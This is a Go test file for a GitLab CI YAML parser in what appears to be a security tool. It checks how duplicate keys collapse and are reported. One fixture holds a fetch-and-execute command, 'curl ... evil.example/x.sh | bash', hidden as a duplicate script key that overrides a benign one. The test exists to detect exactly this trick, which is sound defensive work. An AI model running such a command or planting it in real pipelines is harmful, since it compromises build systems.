// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package parser

import (
	"testing"

	"gopkg.in/yaml.v3"
)

func mustParse(t *testing.T, src string) *Document {
	t.Helper()
	doc, err := Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return doc
}

func keys(m *yaml.Node) []string {
	var out []string
	for i := 0; i+1 < len(m.Content); i += 2 {
		out = append(out, m.Content[i].Value)
	}
	return out
}

func TestCollapse_DuplicateKeyInJob(t *testing.T) {
	doc := mustParse(t, `
build:
  script:
    - echo safe
  stage: build
  script:
    - curl -s http://evil.example/x.sh | bash
`)
	job := FindKey(doc.MappingNode(), "build")
	if got := scriptLines(t, doc, "build"); len(got) != 1 || got[0] != "curl -s http://evil.example/x.sh | bash" {
		t.Errorf("script = %q, want the last value", got)
	}
	if got := keys(job); len(got) != 2 || got[0] != "stage" || got[1] != "script" {
		t.Errorf("keys = %q, want the winner at its own position", got)
	}
	if len(doc.DuplicateKeys) != 1 {
		t.Fatalf("expected 1 duplicate, got %+v", doc.DuplicateKeys)
	}
	d := doc.DuplicateKeys[0]
	if d.Key.Value != "script" || d.Key.Line != 3 || d.Winner.Line != 6 || d.Job != "build" {
		t.Errorf("unexpected duplicate: key %q line %d, winner line %d, job %q", d.Key.Value, d.Key.Line, d.Winner.Line, d.Job)
	}
}

func TestCollapse_DuplicateJobName(t *testing.T) {
	doc := mustParse(t, `
.base:
  image: alpine:3.20
build:
  script: [echo first]
test:
  script: [make test]
build:
  extends: .base
  script: [echo last]
`)
	top := doc.MappingNode()
	if got := keys(top); len(got) != 3 || got[0] != ".base" || got[1] != "test" || got[2] != "build" {
		t.Errorf("top-level keys = %q", got)
	}
	if CountJobs(doc.Root) != 3 {
		t.Errorf("the earlier build job must not be visited")
	}
	if got := scriptLines(t, doc, "build"); got[0] != "echo last" {
		t.Errorf("build script = %q, want the last definition", got)
	}
	if len(doc.DuplicateKeys) != 1 || doc.DuplicateKeys[0].Job != "build" || doc.DuplicateKeys[0].Key.Line != 4 {
		t.Errorf("unexpected duplicates: %+v", doc.DuplicateKeys)
	}
}

func TestCollapse_TopLevelReservedKeys(t *testing.T) {
	doc := mustParse(t, `
variables:
  A: "1"
include: a.yml
variables:
  B: "2"
include:
  - local: b.yml
build:
  script: [make]
`)
	top := doc.MappingNode()
	if FindKey(FindKey(top, "variables"), "B") == nil || FindKey(FindKey(top, "variables"), "A") != nil {
		t.Error("variables: must be the last block, not merged")
	}
	if FindKey(top, "include").Kind != yaml.SequenceNode {
		t.Error("include: must be the last value")
	}
	if len(doc.DuplicateKeys) != 2 {
		t.Fatalf("expected 2 duplicates, got %d", len(doc.DuplicateKeys))
	}
	for _, d := range doc.DuplicateKeys {
		if d.Job != "" {
			t.Errorf("a reserved key belongs to no job, got %q", d.Job)
		}
	}
}

func TestCollapse_NestedMappings(t *testing.T) {
	doc := mustParse(t, `
build:
  script: [make]
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
      when: always
  artifacts:
    paths: [dist/]
    expire_in: 1 week
    paths: [dist/, .env]
`)
	job := FindKey(doc.MappingNode(), "build")
	rule := FindKey(job, "rules").Content[0]
	if FindKey(rule, "when").Value != "always" {
		t.Error("rules: item must keep the last when:")
	}
	if n := len(FindKey(FindKey(job, "artifacts"), "paths").Content); n != 2 {
		t.Errorf("artifacts:paths has %d items, want the last value with 2", n)
	}
	if len(doc.DuplicateKeys) != 2 {
		t.Fatalf("expected 2 duplicates, got %d", len(doc.DuplicateKeys))
	}
	for _, d := range doc.DuplicateKeys {
		if d.Job != "build" {
			t.Errorf("job = %q, want build", d.Job)
		}
	}
}

func TestCollapse_AnchorCollapsedOnce(t *testing.T) {
	doc := mustParse(t, `
.tpl: &tpl
  script: [echo a]
  script: [echo b]
one:
  <<: *tpl
two:
  <<: *tpl
`)
	for _, job := range []string{"one", "two"} {
		if got := scriptLines(t, doc, job); len(got) != 1 || got[0] != "echo b" {
			t.Errorf("%s script = %q, want the anchor's last value", job, got)
		}
	}
	if len(doc.DuplicateKeys) != 1 {
		t.Errorf("a duplicate in an anchor is reported once, got %d", len(doc.DuplicateKeys))
	}
}

func TestCollapse_MergeKeysUnchanged(t *testing.T) {
	// Explicit keys override merged ones whatever their order, and two merge
	// keys are not duplicates.
	doc := mustParse(t, `
.a: &a
  image: a:1
.b: &b
  stage: b
job:
  image: explicit:1
  <<: *a
  <<: *b
  script: [make]
`)
	job := FindKey(doc.MappingNode(), "job")
	if FindKey(job, "image").Value != "explicit:1" || FindKey(job, "stage") == nil {
		t.Errorf("merge keys handled differently: %q", keys(job))
	}
	if len(doc.DuplicateKeys) != 0 {
		t.Errorf("merge keys are not duplicates: %+v", doc.DuplicateKeys)
	}
}

func TestCollapse_TypeAndCaseMatter(t *testing.T) {
	doc := mustParse(t, `
build:
  Script: [a]
  script: [b]
  variables:
    1: int
    "1": str
`)
	if len(doc.DuplicateKeys) != 0 {
		t.Errorf("keys that differ in case or type are distinct: %+v", doc.DuplicateKeys)
	}
}

func TestCollapse_NoDuplicatesLeavesTreeAlone(t *testing.T) {
	before, err := Parse(sampleCI, "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	var raw yaml.Node
	if err := yaml.Unmarshal(sampleCI, &raw); err != nil {
		t.Fatal(err)
	}
	if len(before.DuplicateKeys) != 0 {
		t.Fatalf("unexpected duplicates: %+v", before.DuplicateKeys)
	}
	got, _ := yaml.Marshal(before.Root)
	want, _ := yaml.Marshal(&raw)
	if string(got) != string(want) {
		t.Errorf("tree changed:\n%s\nwant:\n%s", got, want)
	}
}

func TestCollapse_SpecHeader(t *testing.T) {
	doc := mustParse(t, `spec:
  inputs:
    stage:
      default: test
    stage:
      default: build
---
build:
  stage: $[[ inputs.stage ]]
  script: [make]
`)
	if len(doc.DuplicateKeys) != 1 || doc.DuplicateKeys[0].Job != "" || doc.DuplicateKeys[0].Key.Line != 3 {
		t.Errorf("unexpected duplicates: %+v", doc.DuplicateKeys)
	}
}

func TestFirstAnchor_Nil(t *testing.T) {
	if got := firstAnchor(nil); got != "" {
		t.Errorf("firstAnchor(nil) = %q", got)
	}
}
